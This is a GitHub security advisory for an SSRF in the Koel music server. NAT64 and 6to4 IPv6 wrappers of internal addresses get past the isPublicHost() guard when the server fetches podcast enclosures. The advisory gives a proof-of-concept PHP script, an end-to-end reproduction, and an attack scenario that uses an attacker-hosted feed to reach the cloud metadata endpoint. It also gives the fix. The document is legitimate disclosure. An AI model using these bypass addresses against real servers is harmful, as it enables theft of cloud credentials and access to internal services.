# [M] Koel: Full-read SSRF via podcast enclosure URL: isPublicHost() filter_var guard does not reject NAT64 (64:ff9b::/96) or 6to4 (2002::/16) IPv6-transition wrappers of internal IPv4

## Summary
Severity: Medium
Advisory: GHSA-rjg7-r26h-cfp2
CVE: CVE-2026-54494
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-15
Source: https://github.com/advisories/GHSA-rjg7-r26h-cfp2
Type: github-advisory

## Affected
- Packagist: `phanan/koel` — affected >=0 <9.7.1

## Details
## Summary

Koel's outbound-URL guard `App\Helpers\Network::isPublicHost()` classifies an IP as "public" using PHP's `filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)`. That flag set does **not** recognise IPv6 transition-address forms that embed a private/loopback/link-local IPv4: NAT64 well-known prefix `64:ff9b::/96` (RFC 6052) and 6to4 `2002::/16` (RFC 3056). An address such as `64:ff9b::7f00:1` (= `127.0.0.1`), `64:ff9b::a9fe:a9fe` (= `169.254.169.254`, the cloud metadata endpoint), or `2002:a00:1::` (= `10.0.0.1`) is reported as a public address, so the guard returns `true` and Koel proceeds to fetch the URL.

The guard is the only SSRF defense in front of `App\Values\Podcast\EpisodePlayable::createForEpisode()`, which downloads a podcast episode with `Http::sink($file)->get($url)` and streams the response body back to the requesting user. Because an attacker fully controls the `<enclosure url>` of any RSS feed they host (and any authenticated user can subscribe to a feed), they can publish an enclosure whose hostname has an `AAAA` record that is a NAT64/6to4 wrapper of an internal IP. On hosts with NAT64 or 6to4/dual-stack routing (the standard configuration on IPv6-only AWS/GCP subnets and 6to4-relayed networks), the kernel routes the wrapper to the embedded IPv4, and Koel performs a full-read SSRF against the internal endpoint — returning the response body to the attacker.

This is a server-side request forgery with full response disclosure (CWE-918) against internal services and cloud instance metadata.

## Vulnerable code

`app/Helpers/Network.php` — `isPublicHost()` (the literal-IP branch and the per-resolved-record branch use the identical predicate):

```php
public function isPublicHost(string $host): bool
{
    if (filter_var($host, FILTER_VALIDATE_IP)) {
        return (
            filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false
        );
    }

    try {
        $records = array_merge(dns_get_record($host, DNS_A) ?: [], dns_get_record($host, DNS_AAAA) ?: []);
    } catch (Throwable) {
        return false;
    }

    if ($records === []) {
        return false;
    }

    foreach ($records as $record) {
        $ip = $record['ip'] ?? $record['ipv6'] ?? null;

        if (
            !$ip
            || filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false
        ) {
            return false;
        }
    }

    return true;
}
```

`PHP`'s `FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE` rejects RFC 1918, loopback, link-local and IPv4-mapped IPv6 (`::ffff:a.b.c.d`), but treats NAT64 `64:ff9b::/96` and 6to4 `2002::/16` as ordinary global addresses — even though both forms deterministically embed an IPv4 the kernel will route to.

The sink, `app/Values/Podcast/EpisodePlayable.php` — `createForEpisode()`:

```php
$network = app(Network::class);
$url = (string) $episode->path;

if (!$network->isSafeUrl($url)) {            // isSafeUrl() -> isPublicHost(), the only guard
    throw UnsafeUrlException::forUrl($url);
}

Http::sink($file)
    ->withOptions([
        'allow_redirects' => [
            'max' => 5,
            'on_redirect' => static function (
                RequestInterface $request,
                ResponseInterface $response,
                UriInterface $uri,
            ) use ($network): void {
                if (!$network->isSafeUrl((string) $uri)) {   // same guard on redirects -> same bypass
                    throw UnsafeUrlException::forUrl((string) $uri);
                }
            },
        ],
    ])
    ->get($url)                              // full-read SSRF: response streamed into $file
    ->throw();
```

`$episode->path` is the `<enclosure url>` from the subscribed podcast RSS feed. The redirect callback reuses the same `isSafeUrl()`, so a redirect to a NAT64/6to4 host is also accepted.

## Attack scenario / How input reaches the sink

1. Attacker hosts a podcast RSS feed and serves an item whose enclosure is `<enclosure url="http://int.attacker.example/secret" type="audio/mpeg"/>`, where `int.attacker.example` publishes `AAAA = 64:ff9b::a9fe:a9fe` (NAT64 wrapper of `169.254.169.254`) or `2002:a00:1::` (6to4 wrapper of `10.0.0.1`). The attacker may also use a bare IPv6-literal enclosure host directly.
2. A Koel user subscribes to the feed (a standard, intended feature — the podcast subscription endpoint accepts an arbitrary feed URL) and plays / streams the episode.
3. `EpisodePlayable::createForEpisode()` calls `isSafeUrl($url)`. The host resolves to the NAT64/6to4 address; `isPublicHost()` runs `filter_var(NO_PRIV_RANGE | NO_RES_RANGE)` over the embedded-IPv4 transition form and returns `true`.
4. `Http::sink($file)->get($url)` connects. On a NAT64/dual-stack/6to4-routed host the kernel forwards to the embedded internal IPv4. The internal response body is written to `$file` and served back to the user — full-read SSRF against internal services / cloud IMDS.

## Proof of concept

### (a) Guard-predicate proof (PHP 8.5, the exact `filter_var` call)

```php
<?php
function isPublicHost_literal(string $ip): bool {        // koel Network::isPublicHost literal branch
    if (!filter_var($ip, FILTER_VALIDATE_IP)) return false;
    return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false;
}
foreach ([
  ['NAT64(127.0.0.1)','64:ff9b::7f00:1'], ['NAT64(169.254.169.254 IMDS)','64:ff9b::a9fe:a9fe'],
  ['NAT64(10.0.0.1)','64:ff9b::a00:1'],   ['6to4(127.0.0.1)','2002:7f00:1::'],
  ['6to4(169.254.169.254)','2002:a9fe:a9fe::'], ['6to4(10.0.0.1)','2002:a00:1::'],
  ['direct 127.0.0.1','127.0.0.1'], ['direct 10.0.0.1','10.0.0.1'],
  ['direct 169.254.169.254','169.254.169.254'], ['IPv4-mapped ::ffff:10.0.0.1','::ffff:10.0.0.1'],
] as [$l,$ip]) printf("%-30s %-22s passes_public=%s\n",$l,$ip,isPublicHost_literal($ip)?'YES(BYPASS)':'no(blocked)');
```

Verbatim output:

```
NAT64(127.0.0.1)               64:ff9b::7f00:1        passes_public=YES(BYPASS)
NAT64(169.254.169.254 IMDS)    64:ff9b::a9fe:a9fe     passes_public=YES(BYPASS)
NAT64(10.0.0.1)                64:ff9b::a00:1         passes_public=YES(BYPASS)
6to4(127.0.0.1)                2002:7f00:1::          passes_public=YES(BYPASS)
6to4(169.254.169.254)          2002:a9fe:a9fe::       passes_public=YES(BYPASS)
6to4(10.0.0.1)                 2002:a00:1::           passes_public=YES(BYPASS)
direct 127.0.0.1               127.0.0.1              passes_public=no(blocked)
direct 10.0.0.1                10.0.0.1               passes_public=no(blocked)
direct 169.254.169.254         169.254.169.254        passes_public=no(blocked)
IPv4-mapped ::ffff:10.0.0.1    ::ffff:10.0.0.1        passes_public=no(blocked)
```

### End-to-end reproduction against pinned koel v9.5.0

Environment: `git clone --branch v9.5.0 https://github.com/koel/koel.git` + `composer install`, run inside a `php:8.5-cli` container started with `--cap-add=NET_ADMIN` so the NAT64 and 6to4 prefixes can be assigned to `lo`, simulating a NAT64/dual-stack host's kernel routing:

```
ip -6 addr add 64:ff9b::7f00:1/128 dev lo    # NAT64 wrapper of 127.0.0.1 -> loopback
ip -6 addr add 2002:7f00:1::/128 dev lo       # 6to4 wrapper of 127.0.0.1  -> loopback
```

A localhost stand-in "internal IMDS" server listens on those literals and returns `SENTINEL_INTERNAL_IMDS_SECRET=ssrf-proven-token-koel-nat64`. The harness boots a real Laravel container, resolves the **genuine released** `App\Helpers\Network` (from `app/Helpers/Network.php`), invokes its real `isPublicHost()` on each attacker `AAAA`-record value, then runs the verbatim `EpisodePlayable::createForEpisode()` body (`isSafeUrl` guard, then `Http::sink($file)->get($url)` via Laravel's real Guzzle-backed client):

```php
$network = $app->make(App\Helpers\Network::class);   // resolved from app/Helpers/Network.php
// STEP 1: genuine guard decision on the attacker AAAA-record value
foreach ($aaaa as [$label,$ip]) echo $network->isPublicHost($ip) ? 'true' : 'false';
// STEP 2: verbatim createForEpisode body
if (!$network->isPublicHost($hostForGuard)) { /* REJECTED */ }
else { Http::sink($file)->withOptions([...])->get($url); /* fetch + read body */ }
```

Verbatim output:

```
Network class (genuine released koel source): App\Helpers\Network
Resolved from: /app/app/Helpers/Network.php
Guard predicate source (app/Helpers/Network.php isPublicHost):
    filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)

==== STEP 1 — genuine $network->isPublicHost() on attacker AAAA-record value (the only guard) ====
  isPublicHost(64:ff9b::7f00:1     ) = true   [NAT64(127.0.0.1)  -> loopback] expect=bypass-expected
  isPublicHost(64:ff9b::a9fe:a9fe  ) = true   [NAT64(169.254.169.254) -> AWS IMDS] expect=bypass-expected
  isPublicHost(2002:a00:1::        ) = true   [6to4(10.0.0.1)   -> RFC1918] expect=bypass-expected
  isPublicHost(10.0.0.1            ) = false  [DIRECT RFC1918 10.0.0.1 (neg ctrl A)] expect=must-block
  isPublicHost(::ffff:10.0.0.1     ) = false  [IPv4-mapped ::ffff:10.0.0.1 (neg B)] expect=must-block
  isPublicHost(127.0.0.1           ) = false  [DIRECT loopback 127.0.0.1 (neg ctrl)] expect=must-block
  isPublicHost(8.8.8.8             ) = true   [PUBLIC 8.8.8.8 (positive ctrl)] expect=must-allow

==== STEP 2 — genuine EpisodePlayable fetch via Http::sink (real network) ====
[IMDS-STANDIN HIT] local_addr_reached=[64:ff9b::7f00:1]:18099 peer=[64:ff9b::7f00:1]:37214 request_line="GET /secret HTTP/1.1" Host: [64:ff9b::7f00:1]:18099
  [NAT64 well-known of 127.0.0.1]
    url=http://[64:ff9b::7f00:1]:18099/secret
    guard=PASSED fetched=YES status=200
    sink_body=SENTINEL_INTERNAL_IMDS_SECRET=ssrf-proven-token-koel-nat64
[IMDS-STANDIN HIT] local_addr_reached=[2002:7f00:1::]:18099 peer=[2002:7f00:1::]:49654 request_line="GET /secret HTTP/1.1" Host: [2002:7f00:1::]:18099
  [6to4 of 127.0.0.1]
    url=http://[2002:7f00:1::]:18099/secret
    guard=PASSED fetched=YES status=200
    sink_body=SENTINEL_INTERNAL_IMDS_SECRET=ssrf-proven-token-koel-nat64
  [DIRECT RFC1918 10.0.0.1 (neg ctrl A)]
    url=http://10.0.0.1:18099/secret
    guard=REJECTED fetched=no status=-
    sink_body=(none)

==== E2E DONE ====
```

Result: both NAT64 and 6to4 enclosure URLs pass the genuine `isPublicHost`/`isSafeUrl` guard, the genuine `Http::sink()->get()` connects to the internal stand-in, and the internal response body (`SENTINEL_INTERNAL_IMDS_SECRET=...`) is read back — full-read SSRF.

### Negative controls

- `http://10.0.0.1` (direct RFC 1918) — guard `REJECTED`, no fetch (shown above).
- `::ffff:10.0.0.1` (IPv4-mapped IPv6) and `127.0.0.1` / `169.254.169.254` (direct) — `isPublicHost(...) = false` (shown in STEP 1). The existing guard correctly blocks every form **except** the two transition wrappers, confirming the gap is specific to NAT64 `64:ff9b::/96` and 6to4 `2002::/16`.
- `8.8.8.8` (public) — `isPublicHost(...) = true` (positive control: legitimate public hosts are unaffected by the proposed fix).

## Impact

Full-read SSRF (CWE-918). An authenticated user able to subscribe to a podcast feed they control can coerce the Koel server into issuing HTTP requests to internal services and reading the responses:

- Cloud instance metadata (`http://[64:ff9b::a9fe:a9fe]/latest/meta-data/...`) — credential / IAM-role token theft on AWS/GCP/Azure.
- Internal-only HTTP services (admin panels, databases with HTTP fronts, `localhost` daemons) reachable from the Koel host.

Precondition: the Koel host has NAT64 (`64:ff9b::/96`) or 6to4/dual-stack routing for the transition prefix — the default on IPv6-only AWS/GCP subnets (NAT64) and on 6to4-relayed dual-stack networks. This is the same host-precondition class under which the IPv4/IPv6-literal SSRF guard is meaningful at all.

## Suggested fix

In `isPublicHost()`, before classifying an IP, normalise IPv6 transition forms by extracting the embedded IPv4 and re-running the private/reserved check on it, and additionally reject the transition prefixes outright. Concretely: for any IPv6 address, detect NAT64 (`64:ff9b::/96`, `64:ff9b:1::/48`), 6to4 (`2002::/16`), IPv4-mapped (`::ffff:0:0/96`, already covered by the flag but should be unwrapped for consistency), Teredo (`2001::/32`) and IPv4-compatible (`::/96`) wrappers, extract the embedded IPv4, and require it to pass `FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE` as well. The same unwrap must be applied to every IP resolved in the DNS branch. A fix PR implementing this (with regression tests over NAT64/6to4/Teredo/IPv4-compatible wrappers of loopback / RFC 1918 / link-local / IMDS plus public-host positive controls) is linked below.

## Fix PR

A fix is provided via a private fork PR against the advisory's temporary fork (linked from the advisory's "Collaborators" / fix workflow). It adds an `extractEmbeddedIpv4()` helper covering IPv4-mapped, IPv4-compatible, 6to4, NAT64 well-known and NAT64-discovery forms, recurse-checks the embedded IPv4 against the existing `NO_PRIV_RANGE | NO_RES_RANGE` predicate in both the literal-IP and per-resolved-record branches of `isPublicHost()`, and adds regression tests.

## Credit

Reported by tonghuaroot.

## References
- https://github.com/koel/koel/security/advisories/GHSA-rjg7-r26h-cfp2
- https://github.com/koel/koel/pull/2549
- https://github.com/koel/koel/commit/5f6ce2cefd08f437a269236b677ad971517ccbb6
- https://github.com/koel/koel
- https://github.com/koel/koel/releases/tag/v9.7.1
